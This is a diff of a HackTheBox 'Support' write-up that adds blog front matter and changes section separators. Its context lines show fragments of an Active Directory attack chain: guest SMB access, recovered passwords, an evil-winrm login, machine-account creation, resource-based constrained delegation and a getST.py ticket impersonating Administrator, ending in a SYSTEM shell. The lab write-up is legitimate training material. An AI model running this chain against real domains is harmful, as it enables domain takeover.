@@ -1,3 +1,11 @@
+---
+layout: post
+title: "Support - HackTheBox Writeup"
+date: 2025-01-01
+categories: [HackTheBox, ActiveDirectory]
+tags: [smb, ldap, bloodhound, rbcd, kerberos]
+---
+
 # Reconnaissance
 
 ## Host Discovery
@@ -19,7 +27,7 @@ The responses returned a TTL of **127**, which is commonly associated with Windo
 
 Although TTL alone cannot accurately identify an operating system, it provides a useful initial indicator that the target is likely running Windows.
 
----
+***
 
 # Port Scanning
 
@@ -67,7 +75,7 @@ Result:
 10.129.230.181 DC.support.htb support.htb DC
 ```
 
----
+***
 
 # SMB Enumeration
 
@@ -101,7 +109,7 @@ support-tools
 
 This share was readable by Guest users and appeared to contain internal tools used by the organization's support staff.
 
----
+***
 
 # Analyzing the Support Tools
 
@@ -162,7 +170,7 @@ nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 
 The recovered string appeared to be a password.
 
----
+***
 
 # LDAP Enumeration
 
@@ -190,7 +198,7 @@ During the enumeration I noticed that the **info** attribute of the `support` us
 
 These credentials belonged to the `support` account.
 
----
+***
 
 # Initial Access
 
@@ -204,7 +212,7 @@ evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
 
 After authenticating successfully, I obtained the user flag.
 
----
+***
 
 # Privilege Escalation
 
@@ -230,7 +238,7 @@ MachineAccountQuota: 10
 
 Since the quota was greater than zero, the account was allowed to create new computer objects.
 
----
+***
 
 # Creating a Machine Account
 
@@ -242,7 +250,7 @@ bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure4
 
 The computer account was successfully created.
 
----
+***
 
 # Configuring Resource-Based Constrained Delegation
 
@@ -256,7 +264,7 @@ The delegation rights were successfully updated.
 
 At this point, the attacker-controlled computer account was authorized to impersonate users when accessing services running on the Domain Controller.
 
----
+***
 
 # Requesting a Kerberos Service Ticket
 
@@ -268,7 +276,7 @@ getST.py -spn cifs/DC.support.htb -impersonate Administrator support.htb/z2k$:pa
 
 The ticket was generated through the Kerberos **S4U2Self** and **S4U2Proxy** extensions.
 
----
+***
 
 # Pass-the-Ticket
 
@@ -292,7 +300,7 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
----
+***
 
 # Conclusion
 
